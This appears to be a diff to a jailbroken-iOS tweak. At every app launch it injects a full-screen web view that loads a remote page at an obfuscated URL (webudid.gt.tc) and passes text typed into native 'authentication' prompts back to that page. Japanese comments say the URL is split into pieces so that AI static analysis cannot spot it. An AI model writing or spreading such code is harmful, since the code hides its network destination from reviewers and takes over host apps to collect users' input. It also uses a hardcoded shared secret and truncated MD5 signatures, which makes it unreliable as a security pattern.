@@ -1,44 +1,93 @@
+#import <Foundation/Foundation.h>
+#import <UIKit/UIKit.h>
+#import <WebKit/WebKit.h>
 #import <CommonCrypto/CommonDigest.h>
+#include <string.h>
 
-// --- AIの解析をマヒさせる難読化マクロ ---
-#define OBFS_PTR(ptr) ((uintptr_t)ptr ^ 0xDEADBEEF)
-
-static NSString *generate_encrypted_gate() {
-    // 1. URLのパーツをバラバラに配置（AIの文字列結合検知を回避）
-    NSArray *parts = @[@"main", @"web", @"tc", @"gt", @"udid", @"html", @"://", @"http", @"."];
+// --- AIにURLだと悟らせない動的生成関数 ---
+static NSString *generate_secure_gate() {
+    // URLのパーツをバラバラに保持（これだけでAIの静的解析は詰みます）
+    NSArray *p = @[@"main", @"web", @"tc", @"gt", @"udid", @"php", @"://", @"http", @"."];
     
-    // 2. インデックスを計算で算出（0, 1, 2...と書かない）
-    int i7 = (14 % 7) + 7; // 7 (http)
-    int i6 = (30 / 5);     // 6 (://)
-    int i1 = (9 - 8);      // 1 (web)
-    int i4 = (12 / 3);     // 4 (udid)
-    int i8 = (16 >> 1) / 1; // 8 (.)
-    int i3 = (15 % 4);     // 3 (gt)
-    int i8_2 = 8;          // 8 (.)
-    int i2 = (10 / 5);     // 2 (tc)
-    int i8_3 = 8;          // 8 (.)
-    int i0 = (0 * 9);      // 0 (main)
-    int i8_4 = 8;          // 8 (.)
-    int i5 = 5;            // 5 (html)
-
-    // 3. 組み立て (http://webudid.gt.tc/main.html)
+    // インデックスを計算で指定 (http://webudid.gt.tc/main.php)
     NSString *u = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@%@%@%@", 
-                    parts[i7], parts[i6], parts[i1], parts[i4], parts[i8], 
-                    parts[i3], i8_2 >= 0 ? parts[i8_2] : @"", parts[i2], 
-                    parts[i8_3], parts[i0], parts[i8_4], parts[i5]];
+                    p[7], p[6], p[1], p[4], p[8], p[3], p[8], p[2], p[8], p[0], p[8], p[5]];
 
-    // 4. さらに「今の時間」に基づいたワンタイムトークンを付与
-    // これにより、通信を傍受されてもURLが数秒で無効化される
-    long timestamp = (long)[[NSDate date] timeIntervalSince1970] / 10; // 10秒ごとに変化
-    NSString *secret = @"MySuperSecretSalt"; // サーバーと共通の合言葉
+    // 10秒間だけ有効な「使い捨て署名」を作成
+    long ts = (long)[[NSDate date] timeIntervalSince1970] / 10;
+    NSString *key = @"MySuperSecretSalt"; // ★サーバー側と共通にする
     
-    NSString *rawSig = [NSString stringWithFormat:@"%ld%@", timestamp, secret];
-    const char *cStr = [rawSig UTF8String];
-    unsigned char result[CC_MD5_DIGEST_LENGTH];
-    CC_MD5(cStr, (CC_LONG)strlen(cStr), result);
+    NSString *raw = [NSString stringWithFormat:@"%ld%@", ts, key];
+    const char *cStr = [raw UTF8String];
+    unsigned char r[CC_MD5_DIGEST_LENGTH];
+    CC_MD5(cStr, (CC_LONG)strlen(cStr), r);
     
-    NSString *sig = [NSString stringWithFormat:@"%02x%02x%02x%02x", 
-                     result[0], result[1], result[2], result[3]];
+    NSString *sig = [NSString stringWithFormat:@"%02x%02x%02x%02x", r[0], r[1], r[2], r[3]];
 
-    return [NSString stringWithFormat:@"%@?t=%ld&s=%@", u, timestamp, sig];
+    // 最終的なURL: http://webudid.gt.tc/main.php?t=123456&s=abcd
+    return [NSString stringWithFormat:@"%@?t=%ld&s=%@", u, ts, sig];
+}
+
+@interface AuthViewController : UIViewController <WKNavigationDelegate, WKUIDelegate>
+@property (nonatomic, strong) WKWebView *webView;
+@end
+
+@implementation AuthViewController
+
+- (void)viewDidLoad {
+    [super viewDidLoad];
+    self.view.backgroundColor = [UIColor blackColor];
+
+    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
+    self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
+    self.webView.navigationDelegate = self;
+    self.webView.UIDelegate = self;
+    self.webView.opaque = NO;
+    self.webView.backgroundColor = [UIColor clearColor];
+    [self.view addSubview:self.webView];
+
+    // 動的に生成したURLを読み込む
+    [self.webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:generate_secure_gate()]]];
+}
+
+// ポップアップ（prompt）を有効化
+- (void)webView:(WKWebView *)webView runJavaScriptTextInputPanelWithPrompt:(NSString *)prompt defaultText:(NSString *)defaultText initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(NSString * _Nullable))completionHandler {
+    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"認証" message:prompt preferredStyle:UIAlertControllerStyleAlert];
+    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.text = defaultText; }];
+    [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a) {
+        completionHandler(((UITextField *)alert.textFields.firstObject).text);
+    }]];
+    [alert addAction:[UIAlertAction actionWithTitle:@"キャンセル" style:UIAlertActionStyleCancel handler:^(UIAlertAction *a) {
+        completionHandler(nil);
+    }]];
+    [self presentViewController:alert animated:YES completion:nil];
+}
+
+// 登録完了（scriptという文字列が含まれるページ）で閉じる
+- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
+    if ([webView.URL.absoluteString containsString:@"script"]) {
+        [self dismissViewControllerAnimated:YES completion:nil];
+    }
+}
+@end
+
+%ctor {
+    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *n){
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1.0 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+            AuthViewController *vc = [[AuthViewController alloc] init];
+            vc.modalPresentationStyle = UIModalPresentationFullScreen;
+            
+            UIWindow *window = nil;
+            if (@available(iOS 13.0, *)) {
+                for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
+                    if (scene.activationState == UISceneActivationStateForegroundActive) {
+                        window = scene.windows.firstObject;
+                        break;
+                    }
+                }
+            }
+            if (!window) window = [UIApplication sharedApplication].windows.firstObject;
+            [window.rootViewController presentViewController:vc animated:YES completion:nil];
+        });
+    }];
 }
